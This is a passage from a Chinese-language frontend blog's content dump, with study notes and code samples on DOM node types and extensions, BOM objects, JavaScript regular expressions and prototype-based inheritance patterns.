元素的子节点元素可以任意多的子节点和后代节点。 childNodes 属性包含了所有的子节点。 Text 类型不包含 HTML 结构的纯文本 特点： nodeType 为 3 nodeName 为 “#text” nodeValue 为 节点所包含的文本 parentNode 是 Element 可以通过 nodeValue 属性或 data 属性访问 Text 节点中包含的文本。 appendData(text): 将 text 添加到节点的末尾 deleteData(offset, count): 从 offset 指定的位置开始删除 count 个字符 insertData(offset, text): 从 offset 指定的位置开始插入 text replaceData(offset, count, text): 用 text 替换 offset 指定的位置开始到 + offset+count 为止处的文本。 splitText(offset): 从 offset 指定的位置将当前文本分成两个文本节点 substringData(offset, count): 提取从 offset 指定的位置开始到 offset + count 为止处的字符串 还有个 length 属性，保存着节点中字符的数目。 创建文本节点 document.createTextNode() 创建新文本节点 接受一个参数-要创建的文本 规范化文本节点 normalize() 在包含两个或多个文本节点的父元素上调用此方法，则会将所有文本节点合并成一个节点。 切割文本节点 splitText() 将一个文本分隔成两个文本节点。 Comment 类型特点： nodeType 为 8 nodeName 为 “#document” nodeValue 为 注释内容 parentNode 是 Document 或 Element 无子节点 CDATASection 类型特点： nodeType 为 4 nodeName 为 “#cdata-section” nodeValue 为 CDATA 区域中的内容 parentNode 是 Document 或 Element 无子节点 DocumentType 类型特点： nodeType 为 10 nodeName 为 doctype 的名称 nodeValue 为 null parentNode 是 Document 无子节点 DocumentFragment 类型特点： nodeType 为 11 nodeName 为 “#document-fragment” nodeValue 为 null parentNode 是 null 子节点可以是 Element、ProcessingInstruction、Comment、Text、CDATASection 或 EntityReference 使用 document.createDocumentFragment() 方法。可以通过 appendChild() 或 insertBefore() 将文档片段中内容添加到文档中。 Attr 类型特点： nodeType 为 2 nodeName 为 属性名 nodeValue 为 特性的值 parentNode 是 null HTML 中无子节点 XML 或 HTML 中子节点可以是 Text 或 EntityReference Attr 有 3 个属性：name、value 和 specified。 操作表格 caption tBodies tFoot tHead rows createHead() createTFoot() createCaption() deleteRow(pos) insertRow(pos) cells deleteCell(pos) insertCell(pos) DOM 扩展对 DOM 的两个主要扩展是 Selectors API 和 HTML5。支持的浏览器： IE8+、FireFox 3.5+、Safari 3.1+、Chrome 和 Opera 10+。 选择符 APISelectors APILevel 1 的核心是两个方法： querySelector() 接收一个 CSS 选择符，返回与该模式匹配的第一个元素，如果没有匹配到，返回 null。 querySelectorAll() 接收一个 CSS 选择符，返回一个 NodeList 对象。如果没有找到，NodeList 对象是空的。 Selectors APILevel 2 新增了一个 matchesSelector() 方法，接收一个参数，CSS 选择符，如果调用元素与该选择符匹配，返回 true，否则返回 false。 元素遍历 childElementCount: 返回不包括文本节点和注释的子元素个数； firstElementChild: 指向一个子元素，firstChild 元素版 lastElementChild: 指向最后一个子元素，lastChild 元素版 previousElementChild: 指向前一个兄弟元素。 previousSibling 的元素版 nextElementChild: 指向下一个兄弟元素。 nextSibling 的元素版 HTML5与类相关的扩充 getElementsByClassName(); 通过类名获取元素。 可以通过 document以及所有 HTML 元素调用该方法。 接收一个参数，即包含一或多个类名的字符串。 返回指定类型的所有 NodeList。 getElementsByClassName() 支持的浏览器有 IE9+、FireFox 3+、Safari 3.1+、Chrome 和 Opera 9.5+。 classList 属性HTML5 新增了一种操作类名的方式，就是为所有的元素添加 classList 属性。 add(value): 给定的字符串值添加到列表中。如果值已经存在，就不添加了。 contains(value): 表示列表中是否存在给定的值，如果存在则返回 true，否则返回 false。 remove(value): 从列表中删除给定的字符串。 toggle(value): 如果列表中已存在给定的值，删除它；如果列表值没有给定的值，添加它。 焦点管理 document.activeElement 属性 始终会引用 DOM 中当前获得了焦点的元素。 document.hasFocus() 方法 用于确定文档是否获得了焦点 支持的浏览器有 IE4+、FireFox 3+、Safari 4+、Chrome 和 Opera 8+。 HTMLDocument 的变化readyState 属性 loading， 正则加载文档 complete，已经加载完文档 支持的浏览器有 IE4+、FireFox 3.6+、Safari、Chrome 和 Opera 9+。 兼容模式在标准模式下，document.compatMode 的值等于 “CSS1Compat”; 在混杂模式下，document.compatMode 的值等于 “BackCompat”。 支持的浏览器有 FireFox、Safari 3.1+、Chrome 和 Opera。 head 属性document.head，引用文档的 &lt;head&gt; 元素。 支持的浏览器有 Safari 5、Chrome。 字符集属性 charset 属性表示文档中实际使用的字符集。默认是这个属性值是 “UTF-16”，可以通过 &lt;meta&gt; 元素、响应头部或者直接设置 charset 属性修改这个值。 defaultCharset，表示根据默认浏览器以及操作系统的设置。 document.charset 支持的浏览器有 IE、Safari、Chrome 和 Opera。document.defaultCharset 支持的浏览器有 IE、Safari 和 Chrome。 自定义数据属性自定义数据属性是以 data- 开头的。这些属性可以任意添加、随便命名。 添加了自定义属性之后，可以通过元素的 dataset 属性来访问自定义属性的值。dataset 属性的值是 DOMStringMap 的一个实例，也就是键值对的映射。在这个映射中，每一个 data-name 形式的属性都会有一个对应的属性，只不过属性名没有 data- 前缀。 支持的浏览器有 FireFox 6+ 和 Chrome。 插入标记 innerHTML 属性 读模式下，innerHTML 属性返回与调用元素的所有子节点（包括元素、注释和文本节点）对应的 HTML 标记； 写模式下，innerHTML 会根据指定的值创建新的 DOM 树，然后用这个 DOM 树完全替换调用元素原先的所有子节点。 读模式返回的字符串内容各浏览器之间有差异 写模式 innerHTML 的值被认为是 HTML，如果是纯文本，则设置纯文本 innerHTML 中的 &lt;script&gt; 标签不会执行其中的脚本 并不是所有的元素都支持 innerHTML 属性。 &lt;col&gt;、&lt;colgrounp&gt;、&lt;frameset&gt;、&lt;head&gt;、&lt;html&gt;、&lt;style&gt;、&lt;table&gt;、&lt;tbody&gt;、&lt;thead&gt;、&lt;tfoot&gt;、&lt;tr&gt; IE8 以及之前的版本 &lt;title&gt; 没有 innerHTML 属性 outerHTML 属性 读模式下，outerHTML 属性返回与调用元素的所有子节点的 HTML 标签； 写模式下，outerHTML 会根据指定的值创建新的 DOM 树，然后用这个 DOM 树完全替换调用元素。 支持的浏览器有 IE4+、Safari 4+、Chrome 和 Opera 8+。 innerAdjacentHTML() 方法 接收两个参数：插入位置和要插入的 HTML 文本，第一个参数必须是： “beforebegin” 在当前元素之前插入一个紧邻的兄弟元素 “afterbegin” 在当前元素之下插入一个新的子元素或在第一个子元素之前再插入新的子元素 “beforeend” 在当前元素之下插入一个新的子元素或在最后一个子元素之后再插入新的子元素 “afterend” 在当前元素之后插入一个紧邻的兄弟元素 内存与性能在使用innerHTML、outerHTML、innerAdjacentHTML() 等时最好先把被替换元素上绑定的事件处理程序删除。 使用 innerHTML 方法时，首先拼串，然后在往 DOM 树中添加，提高性能。 scrollIntoView() 方法任何 HTML 元素都可以调用，通过滚动浏览器窗口或某个容器元素，调用元素就可以出现在时口中。 支持的浏览器有 IE、Safari、FireFox 和 Opera。 专有扩展文档模式文档模式决定了页面可以使用什么功能。有混杂模式和标准模式。 通过 document.documentMode 属性可以指定给定页面使用的是什么样的文档模式。 children 属性返回只包含元素中同样还是元素的子节点，与 childNodes 没区别。 contains() 方法返回 true 或 false，如果传入的参数元素是调用元素的后代，则返回 true，否则返回 false。 插入文本 innerText 属性 可以操作元素中包含的所有文本内容 会按照由浅到深的顺序，将子文档树中的所有文本都拼接起来 会对文本中存在的 HTML 语法字符进行编码 支持 innerText 属性有 IE9+、Safari 3+、Chrome 和 Opera 8+。 textContext 属性 是 DOMLevel 3 规定的一个属性。 支持 textContext 属性有 IE9+、Safari 3+、Chrome、FireFox 和 Opera 10+。 outerText 它的读模式和 innerText 没区别 写模式：outerText 不只是替换调用它的子节点，而是会替换包括替换整个元素。 支持的浏览器有 IE4+、Safari3+、Chrome 和 Opera8+。 123456789101112131415//封装function getInnerText(element) &#123; if (typeof element.innerText === "string") &#123; return element.innerText; &#125; else &#123; return element.textContent; &#125;&#125;function setInnerText(element, content) &#123; if (typeof element.innerText === "string") &#123; element.innerText = content; &#125; else &#123; element.textContent = content; &#125;&#125; 滚动 scrollIntoViewIfNeeded(alignCenter): 只有当前元素在视口中不可见的情况下，才能滚动浏览器窗口或容器让其可见。 scrollByLines(lineCount): 将元素的内容滚动指定的行高； scrollByPages(pageCount): 将元素的内容滚动指定页面的高度； 支持的浏览器 Chrome 和 Safari。scrollIntoView() 是唯一个所有浏览器都支持的方法，所以比较常用。 DOM2 和 DOM3DOM1 级主要定义的是 HTML 和 XML 文档的底层结构。DOM2 和 DOM3 则在这个基础上引进了更多的交互能力。DOM2 和 DOM3 分为很多模块。如下： DOM2 级核心(DOM Level 2 Core)：为节点添加了更多的方法和属性 DOM2 级视图(DOM Level 2 Views)：为文档定义了基于样式基本信息的不同视图。 DOM2 级事件(DOM Level 2 Events): 说明了如何使用事件与 DOM 文档操作 DOM2 级样式(DOM Level 2 Style)：定义了如何通过编程方式操作 CSS 样式 DOM2 级遍历和范围(DOM Level 2 Trversal and Range): 引入了遍历 DOM 文档和选择其他特定部分的新接口。 DOM2 级 HTML(DOM Level 2 HTML)：在 1 级 HTML 基础上添加了更多的属性、方法和新接口 DOM 变化针对 XML 命名空间的变化HTML 不支持 XML 命名空间，XHTML 支持 XML 的命名空间。 命名空间使用 xmlns 特性来定义。 Node 类型变化 Document 类型变化 Element 类型变化 NamedNodeMap 类型的变化 NamedNodeMap 类型的变化 Document 类型的变化 框架的变化 样式访问元素的样式任何支持 style 特性的 HTML 元素在 JavaScript 中都有一个对应的 style 属性。在 style 特性指定的任何 CSS 属性都将表现为 style 对象的相应属性。对于使用短线分隔的 CSS 属性，将其转换成驼峰大小写的形式。 float 是 javascript 的保留字，不能用作属性名，其相应的属性名是 cssFloat，FireFox、Safari、Opera、Chrome 都支持；但是 IE 支持的是 styleFloat. 直接可以访问的样式：widh; height; padding; margin; display; 设置和获取样式 通过对象的style属性只能设置和获取行内样式 获取样式的时候 如果行内没有该样式 输出空字符串 设置样式的时候 赋的值是一个字符串 如果这个属性有单位 一定要节点加单位 什么情况通过class控制样式 什么情况通过style控制样式不严格的说： 如果样式很多 通过 直接控制类名 的方式加样式 如果样式比较少 通过直接设置比较方便 严格来说： 从标准的角度讲 即使是样式比较少的时候 设置样式也要用类名 但是有一类情况 是无论如何也必须直接通过JS加的 那就是涉及到计算的时候 DOM 样式属性和方法 cssText length 应用给元素的 CSS 属性 parentRule getPropertyCSSValue(propertyName) getPropertyPriority(propertyName) getPropertyValue(propertyName) item(index) 返回给定位置的 CSS 属性名称。 removeProperty(propertyName) setProperty(propertyName, value, priority) 计算的样式 getComputedStyle() 接收两个参数：要获取的计算样式的元素和一个伪元素字符串。第二个参数是可选的 在 IE 中不支持，而是有个 currentStyle 属性 使用 document.defaulView.getComputedStyle(DOM元素, 伪元素/null) 返回 CSSStyleDeclaration 对象，包含当前元素的所有计算的样式。 操作样式表 disabled href media ownerNode parentStyleSheet title type cssRules ownerRule deleteRule(index) inserRule(rule, index) 应用于文档的所有样式表时通过 document.styleSheets 集合来表示的。IE 支持的是 styleSheet 属性 而其他浏览器都支持 sheet 属性。 CSS 规则，CSSStyleRule 类型继承了 CSSRule，包含以下属性： CSSText parentRule parentStyleSheet selectorText style type 创建规则 sheet.insertRule() 接收两个参数：规则文本和在哪里插入规则的索引。 除了 IE 以外的其它四个浏览器支持 sheet.addRule() 接收两个必选参数一个可选参数：选择符文本和CSS样式信息，在哪里插入规则的索引。 IE 浏览器支持 删除规则 sheet.deleteRule() 接收一个参数：要删除规则的位置 除了 IE 以外的其它四个浏览器支持 sheet.removeRule() 接收一个参数：要删除规则的位置 IE 浏览器支持 元素的大小偏移量：包括元素在屏幕上占用的所有的可见的空间。由其高度、宽度来决定，包括内边距、滚动条和边框大小。 偏移量 offsetHeight offsetWidth offsetLeft offsetTop 客户区的大小：不包括边框，包括内边距 clientWidth clientHeight 滚动大小：包含滚动内容的大小 scrollHeight scrollWidth scrollLeft scrollTop 确定元素的大小 getBoundingClientRect() 方法返回一个矩形对象，有四个属性： left、top、right、bottom 给出了元素在叶明中相对于视口的位置。 遍历NodeIterator可以使用 document.createNodeIterator() 方法来创建 NodeIterator 的新实例，接收四个参数。 root: 想要搜索的起始树中的节点 whatToShow: 要访问哪些节点的数字代码 filter: 是一个 NodeFilter 对象，表示应该接收还是拒绝某种特定的节点的函数 entityReferenceExpansion: 布尔值，是否要扩展引用。 whatToShow 的参数在这里不再列出，需要的时候直接查找 JavaScript 高级程序设计； TreeWalker是 NodeIterator 的更高级版本。可以使用 document.createTreeWalker() 方法来创建 TreeWalker 的新实例，接收四个参数。 范围有关范围的一些方法、属性此处不再列出。详细更多参见 《JavaScript 高级程序设计》 总结动态创建结构 方式一：直接在文档中书写 document.write(“内容”) 方式二：改变元素对象内部的HTML innerHTML=”内容” 方式三：创建或克隆节点并追加 createElement(); cloneNode(); 通过这两种方法创建出来的元素只是保存在内存中，必须放到页面上才行! 动态创建结构（效率问题） 把字符串变为文档对象 把当前对象挂接到DOM树上 渲染引擎根据新的DOM树重新渲染]]></content>
      <categories>
        <category>DOM系列</category>
      </categories>
      <tags>
        <tag>DOM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BOM-浏览器对象模型]]></title>
    <url>%2F2015%2F09%2F28%2FBOM-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[DOM:中的顶级对象是document—-太监(大总管);BOM:中的顶级对象是window——皇上;整个浏览器就是window,页面中的document也属于window 变量,函数,对象都属于window 但是:写代码的时候,window可以直接省略 window 对象BOM，即浏览器对象模型，核心是：window 对象 全局变量全局变量不能通过 delete 操作符删除。 窗口关系及框架如果页面中包含框架，每个框架都有自己的 window 对象，并且保存在 frames 集合中。每一个 window 对象都有一个 name 属性，其中包含框架的名称。 123456789101112&lt;html&gt; &lt;head&gt; &lt;title&gt;Frameset Example&lt;/title&gt; &lt;/head&gt; &lt;frameset rows="160, *"&gt; &lt;frame src="frame0.html" name = "topFrame"&gt; &lt;frameset cols="50%, 50%"&gt; &lt;frame src="frame1.html" name = "leftFrame"&gt; &lt;frame src="frame2.html" name = "rightFrame"&gt; &lt;/frameset&gt; &lt;/frameset&gt;&lt;/html&gt; window.frames[0] window.frames[“topFrame”] top.frames[0] top.frames[“topFrame”] frames[0] frames[“topFrame”] 窗口位置IE、Safari、Opera、Chrome 支持 screenLeft screenTop FireFox 支持 screenX screenY 窗口移动方法 moveTo() moveBy() 窗口大小IE9+、Safari、Opera、FireFox、Chrome 支持 innerWidth innerHeight outerWidth outerHeight IE9+、Safari、FireFox 中 outer… 返回浏览器本身的尺寸(window 和 框架都是)。Opera 中则是页面视图容器大小。Chrome 中 两两都返回相同的值，即视口大小而非浏览器窗口大小。 在 IE9、Safari、Opera、FireFox、Chrome 中，document.documentElement.clientWidth 和 document.documentElement.clientHeight 保存了页面视口信息。在 IE 的标准模式下生效，而混杂模式使用的是： document.body 中的 clientHeight 和 clientWidth。而 Chrome 通过 document.body 和 document.documentElement 都可以获取到页面视图。 可以通过检查 document.compatMode 来检测浏览器是否处于标准模式。 导航和打开窗口window.open() 方法，四个参数：要加载的 URL、窗口目标、一个特性字符串以及一个表示新页面是否取代浏览器历史记录中当前加载页面的布尔值。和 a 标签的 herf 属性一个功能。不怎么用。 间歇调用和超时调用 超时调用 setTimeout() 方法 两个参数， 一是要执行的回调函数或一个包含 JavaScript 代码的字符串 而是以毫秒值表示的时间。即在执行前需要等待的时间。 传递字符串消耗性能。 返回一个 ID 在非严格模式下，this 指向 window，严格模式下是 undefined。 clearTimeout() 清除超时调用 间歇调用 setInterval() 方法 参数同 setTimeout() 方法相同 返回也是一个 ID 间歇调用一直执行到页面卸载 clearInterval() 清除间歇调用 系统对话框 alert() confirm() prompt() 12345678if(window.confirm("你确定要退出吗?")) &#123; //执行到这里,证明用户点击了确定按钮 console.log("点击了确定");&#125; else &#123; //证明了用户点击了取消的按钮 console.log("点击了取消");&#125;window.prompt("请输入用户名"); location 对象属性有： hash 返回 URL 中的哈希值 hostname 返回服务器名称和端口号 herf 返回当前页面加载的完整的 URL。 location 对象的 toString() 方法也返回这个值。 pathname 返回 URL 中的目录（或）文件名 port 返回 URL 中指定的端口号 protocol 返回页面使用的协议 search 返回 URL 的查询字符串 方法有： location.assign(“http://www.baidu.com“); 改变浏览器的位置 location.replace(“http://www.baidu.com“); 地址不会记录到历时中—-后退点不了 location.reload(); 刷新—一般情况在页面中用一个按钮点击刷新 BOM的一些方法 win = window.open(“09test.html”,”_blank”,”width=200,height=200,top=100,left=100,resizable=no”); win.close();//此时close方法 无论open中第一个参数是不是地址都可以关闭窗口 win.moveTo(300,300);//把新打开的窗口移动到距离左侧和上面300px win.moveBy(20,20);//每次移动20px win.resizeTo(400,400);//窗口的大小发生了改变 win.resizeBy(40,40); navigator对象属性或方法： appCodeName 浏览器名称 appMinorVersion 此版本信息 appName 完整浏览器名称 appVersion 浏览器版本 buildID cookieEnabled cpuClass javaEnabled() language mimeType onLine opsProfile oscpu platform plugins preference() product productSub register-ContentHandler() register-ProtocalHandler() securifyPolicy systemLanguage taintEnabled() userAgent userLanguage userProfile vendor vendorSub screen 对象用处不大，此处不再详细说明。 history对象 window.history.forward(); window.history.back();//后退 window.history.go();]]></content>
      <categories>
        <category>BOM系列</category>
      </categories>
      <tags>
        <tag>BOM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js的正则表达式]]></title>
    <url>%2F2015%2F09%2F16%2Fjs%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[正则表达式是一个描述字符模式的对象。 JavaScript 的 RegExp 类表示正则表达式，String 和 RegExp 都定义了方法，后者使用正则表达式进行强大的模式匹配和文本检索与替换功能。 正则表达式定义正则表达式的直接量定义为包含在一对斜杠 (/) 之间的字符 如： 1var pattern = /s$/; 正则表达式中的基本元字符 . 通配符（. 除了\n以外的任意一个内容） [] 表示的是范围:表示的是范围中的任意一个 [0-9] 表示的是:0到9之间(包含)任意一个数字 [a-z] 表示所有的小写字母中的一个 [A-Z] 表示的是所有的大写字母中的任意一个 [a-zA-Z] 表示的是所有的字母中的任意一个 [9] 表示的就是9 [0-9a-zA-Z] 表示的是任意的一个数字或者任意的一个字母 ()表示的是分组(为了更明确这个正则表达式的意思),提升优先级 | 表示的是或者的意思 [0-9]|[a-z] 0-9之间的任意一个数字或者是小写字母中的任意一个字母 *表示的是该符号前面的表达式出现了0次到多次 + 表示的是该符号前面的表达式出现了1次到多次 ? 表示的是该符号前面的表达式出现了0次到一次 {} 表示的是前面的表达式出现了多少次,具体是多少次:大括号中的写法 {n,m} 匹配前一项至少 n 次，但不超过 m 次 {n,}匹配前一项 n 次或者更多次 {n} 匹配前一项 0 次或多次，等价于 {0,} 数字、字母、特殊符号 \d 表示的是任意的一个数字和 [0-9] 一样 \D 表示的是非数字，等价于 [^0-9] \s 空白符号 \S 非空白符号 \w 非特殊符号，等价于 [a-zA-Z0-9] \W 特殊符号，等价于 [^a-zA-Z0-9] 之前的元字符、都是不严格的匹配字符串 ^ (1)、以什么内容开头，必须以什么开始; (2)、取反 用法: ^[0-9] 必须以数字开头 ^[a-z0-9] 必须以数字或者以小写字母开始 ^[0-9a-zA-Z]必须以数字或者是字母开头 ^\d 必须以数字开头 [^0-9]取反 字母或者特殊符号 [^0-9a-zA-Z] 特殊符号 $ 必须以什么内容结尾 [0-9]$ “hsgd7y273d9” [a-zA-Z]$ ^[0-9a-z][a-z]$ 指定匹配位置 ^匹配字符串的开头，在多行检索中，匹配一行的开头。 $ 匹配字符串的结尾，在多行检索中，匹配一行的结尾。 \b 匹配一个单词的边界，就是位于 \w 和 \W 之间的位置，或位于字符 \w 和字符串的开头或者结尾之间的位置。 \B 匹配非单词边界的位置 修饰符 i 执行不分区大小写的匹配； g执行一个全局匹配，简言之，即找到所有的匹配，而不是在找到第一个之后就停止； m多行匹配模式， ^ 匹配一行的开头和字符串的开头， $匹配行的结束和字符串的结束。 在js中正则表达式的写法: /正则表达式/ 创建正则表达式对象的方式: (1)、 var reg=new RegExp(/正则表达式/(2)、 var reg=/正则表达式/; reg.test(“hello998”);(3)、 /正则表达式/.方法名(参数); RegExp 属性 source global ignoreCase multiline lastIndex 选择、分组和引用正则表达式的语法还包括指定选择项、子表达式分组和引用前一子表达式的特殊字符串。 字符| 用来分隔供选择的字符。 选择项的尝试匹配次序是从左至右，直到发现了匹配项。如果左边的选择项匹配，就忽略右边的匹配项，即使它产生更好的匹配。 圆括号 () 圆括号的作用：一个作用是把单独的项组合成子表达式，以便可以处理像一个独立的单元那样用”|”、”*”、”+”、或者”?”等来对单元内的项进行处理。 另一个作用是在完整的模式中定义模式。当一个正则表达式成功地和目标字符串相匹配时，可以从目标串中抽出和圆括号中的子模式相匹配的部分。 允许在同一正则表达式的后部引用前面的子表达式。 这是通过在字符 “\” 后加一位或多位数字来实现。这个数字指定了带圆括号的子表达式在正则表达式中的位置。 用于模式匹配的String方法的使用str=str.replace(/帅/g,&quot;呆&quot;);g表示的是全局; i 表示的是小写的str=str.replace(/^\s+|\s+$/g,&quot;&quot;);while((index=reg.exec(str))!=null){console.log(index.index); } // 如果结果为null没有匹配的var result=str.match(/帅/g); // match根据正则表达式匹配字符串中的内容,如果没有g,匹配的是第一个,如果有g匹配的是全局的 search() 参数是一个正则表达式； 返回第一个与之匹配的子串的起始位置； 找不到返回 -1。 如果参数不是正则表达式，则先通过 RegExp 构造函数将它转换成正则表达式； search() 方法不支持全局检索，会忽略正则表达式参数中的修饰符 g。 replace() 方法执行检索与替换操作： 第一个参数是一个正则表达式； 第二个参数是要进行替换的字符串； 如果正则表达式中设置了修饰符 g，那么源字符串中所有与模式匹配的第一个字符串都将替换成第二个蚕食指定的字符串； 如果不带修饰符 g, 则只替换所匹配的第一个字符串。 如果第一个参数是字符串而不是正则表达式，则 replace() 方法将直接搜索这个字符串。 正则表达式如果使用了圆括号括起来的子表达式是带有从左到右的索引编号的，而且正则表达式会记忆与每个子表达式匹配的文本。如果在替换字符串中出现了 $ 加数字，将用于指定的子表达式相匹配的文本来替换这两个字符串。 replace() 方法的第二个参数还可以是函数，该函数能够动态的计算替换字符串。 match() 是最常用的 String 正则表达式。 唯一的参数是一个正则表达式，返回的是一个有匹配结果组成的数组。 如果正则表达式设置了修饰符 g, match() 方法返回的数组包含字符串中的所有匹配结果。 如果正则表达式没有设置修饰符，match() 方法就不会进行全局检索，它只检索第一个匹配。 即使不设置全局，还是返回一个数组。 该数组的第一个元素就是匹配的字符串，余下的元素则是正则表达式中用圆括号括起来的子表达式。因此，如果 match() 返回一个数组 a，那么 a[0] 存放的是完整的匹配，a[1] 存放的则是与第一个用圆括号起来的表达式相匹配的子串，依此类推。 split() split() 方法用以调用它的字符串拆分为一个子串组成的数组，使用的分隔符是 split() 的参数。 RegExp 的方法 exec() 方法返回一个数组 exec() 方法对一个指定的字符串执行一个正则表达式，就是在一个字符串中执行匹配检索； 给字符串的 match() 传入一个非全局的正则表达式，和给这个正则表达式的 exec() 方法传入的字符串是一模一样的，返回一个数组，数组有两个属性：index 和 input。 第一个元素包含的是与正则表达式相匹配的字符串，余下的元素是与圆括号内的子表达式相匹配的子串。 属性 index 包含了发生匹配的字符位置，属性 input引用的是正在检索的字符串。 当调用 exec() 的正则表达式对象具有修饰符 g 时，它将当前正则表达式对象的 lastIndex 属性设置为紧挨着匹配子串的字符位置。当统一正则表达式第二次调用 exec() 时，它将从 lastIndex 属性所指示的字符处开始检索。如果没有匹配结果，会将 lastIndex 重置为 0； test() 方法 参数是一个字符串 用 test() 对某个字符串进行检测，如果包含正则表达式的一个匹配结果，则返回 true；]]></content>
      <categories>
        <category>正则系列</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实现继承的几种方式]]></title>
    <url>%2F2015%2F08%2F28%2F%E5%AE%9E%E7%8E%B0%E7%BB%A7%E6%89%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[ECMAScript 中只支持实现继承，而且主要依靠的是原型链来实现。 扩展原型对象实现继承 描述：直接在构造函数的prototype属性上添加方法 解决的问题：解决了直接将方法设置在构造函数上时，实例化每个对象这些方法都会开辟新空间，造成内存严重浪费的问题 缺点：如果将所有的方法都直接设置到原型对象上，代码冗余 1234567891011/* 一、 扩展原型对象实现继承 */function Person(name, age) &#123; this.name = name; this.age = age;&#125;Person.prototype.personFn = function () &#123; console.log("personFn is run...");&#125;;var p1 = new Person("z3", 13);console.log("============== 一、 扩展原型对象实现继承 ==================");p1.personFn(); 替换原型对象实现继承 描述：将构造函数的原型对象用新对象替换，再往新的对象中添加新方法 解决的问题：扩展原型对象使得代码冗余 缺点：所有的方法和属性都被实例共享 注意：还原构造器 1234567891011121314/* 二、 替换原型对象实现继承 */function Animal(color, type) &#123; this.color = color; this.type = type;&#125;Animal.prototype = &#123; constructor: Animal, animalFn: function () &#123; console.log("animalFn is run..."); &#125;&#125;;var animal = new Animal("white", "cat");console.log("======================== 二、 替换原型对象实现继承 =========================");animal.animalFn(); 另一种原型继承（动态原型模式） 特点：让代码封装到一起1234567891011121314/* 二、 另一种原型继承（动态原型模式） 特点：让代码封装到一起 */function Paper(color, size)&#123; this.color = color; this.size = size; // 动态原型方法 if(typeof this.write !== "function")&#123; Paper.prototype.write = function () &#123; console.log("color: " + this.color + ", size: " + this.size); &#125; &#125;&#125;var paper = new Paper("orange", "16k");console.log("================= 二、另一种原型继承（动态原型模式）====================");paper.write(); 混入继承： 已知两个对象，一个对象继承另一个对象的功能，for..in 描述： jQuery的extend()方法原理是混入继承 1234567891011121314151617181920/* 三、 混入继承： 已知两个对象，一个对象继承另一个对象的功能，for..in */function mixin(target, source) &#123; for (var key in source) &#123; target[key] = source[key]; &#125; return target;&#125;var obj1 = &#123; name: "Amiy", age: 18, pray: function () &#123; console.log("name: " + this.name + ", age: " + this.age + ", sex: " + this.sex + "; obj2.pray is run..."); &#125;&#125;;var obj2 = &#123; sex: false&#125;;mixin(obj2, obj1);console.log("=================== 三、 混入继承： 已知两个对象，一个对象继承另一个对象的功能，for..in ===================");obj2.pray(); 原型+混入继承：混入继承的应用 描述：在一个对象的原型对象上扩展另一个对象的属性和方法 jQuery.fn.extend() 利用的原理是原型+混入继承 1234567891011121314/* 四、 原型+混入继承：混入继承的应用 */function Cat() &#123;&#125;var cat = new Cat();var o2 = &#123; o2Attr1: "o2Attr1", o2Attr2: "o2Attr2", o2Method1: function () &#123; console.log("o2Method1 is run..."); &#125;&#125;;mixin(Cat.prototype, o2);console.log("======== 四、 原型+混入继承：混入继承的应用 =========");cat.o2Method1(); 经典继承：已知一个对象knownObj，需要创建一个新对象，这个新对象继承自已知的对象knownObj 注意： ES5 Object.create()方法的实现原理就是经典继承 12345678910111213141516171819202122232425/* 五、 经典继承：已知一个对象knownObj，需要创建一个新对象，这个新对象继承自已知的对象knownObj */function myCreate(knownObj) &#123; function F() &#123; &#125; F.prototype = knownObj; return new F();&#125;var knownObj = &#123; knownObjAttr1: "knownObjAttr1", knownObjMethod1: function () &#123; console.log("knownObjMethod1 is run..."); &#125;&#125;;var o = myCreate(knownObj);console.log("=============== 五、 经典继承：已知一个对象knownObj，需要创建一个新对象，这个新对象继承自已知的对象knownObj ==================");o.knownObjMethod1();/* 在旧浏览器下实现继承 */if (typeof Object.create !== "function") &#123; Object.create = function (obj) &#123; function F() &#123; &#125; F.prototype = obj; return new F(); &#125;;&#125; 借用构造函数实现继承 特点： 不会继承原型对象上的方法，因为this的指向变了，原型对象上的方法只能通过构造函数的实例来访问 12345678910111213141516171819202122232425262728/* 六： 借用构造函数实现继承 */function Computer(color, type) &#123; this.color = color; this.type = type; this.run = function () &#123; console.log("run method is run... "); &#125;&#125;Computer.prototype.start = function () &#123; console.log("Computer.prototype.start is run...");&#125;;/** * 下面的借用构造函数实现继承就是对这段代码的优化 * function LenovoNoteBook(color, type, interfaceCount) &#123; * this.color = color; * this.type = type; * this.interfaceCount = interfaceCount; * &#125; */function LenovoNoteBook(color, type, interfaceCount) &#123; Computer.call(this, color, type); this.interfaceCount = interfaceCount;&#125;var lenovo = new LenovoNoteBook("write", "Y470", 8);console.log("========= 六： 借用构造函数实现继承 ========");console.log("color: " + lenovo.color + ", type: " + lenovo.type + ", interfaceCount: " + lenovo.interfaceCount);lenovo.run();// lenovo.start(); 混合继承（经典继承+借用构造函数） 特点：解决借用构造函数继承不能够继承原型对象上的方法的问题 缺点：继承了两次构造函数（模板） 12345678910111213141516171819202122232425262728293031323334353637/* 七、 混合继承（经典继承+借用构造函数）*/function BaseCar(type, modelNumber, color) &#123; this.type = type; this.modelNumber = modelNumber; this.color = color;&#125;// 原型对象上的方法BaseCar.prototype = &#123; constructor: BaseCar, canSell: function (price) &#123; var leastPrice = 2500000; if (leastPrice &lt;= price) &#123; return "恭喜恭喜，您可以卖车"; &#125; else &#123; return "您还差:" + (leastPrice - price) + "元就可以买车了"; &#125; &#125;&#125;;/** * Car 构造函数，调用call()实现继承BaseCar中的方法 * @param type * @param modelNumber * @param color * @constructor */function Car(type, modelNumber, color) &#123; BaseCar.call(this, type, modelNumber); this.color = color; this.bmwStart = function () &#123; console.log("Bmv car is starting..."); &#125;&#125;// 经典继承Car.prototype = new BaseCar();var bmwCar = new Car("Bmw", "B34212", "write");console.log("=================== 七、 混合继承（经典继承+借用构造函数） 白贺翔视频 =====================");console.log(bmwCar.canSell(2400000)); 解决混合继承的缺点123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/* 八、 解决混合继承的缺点 */function People(name, age, sex) &#123; this.name = name; this.age = age; this.sex = sex; this.sayHello = function () &#123; console.log("父的构造函数上的静态sayHello方法 运行"); 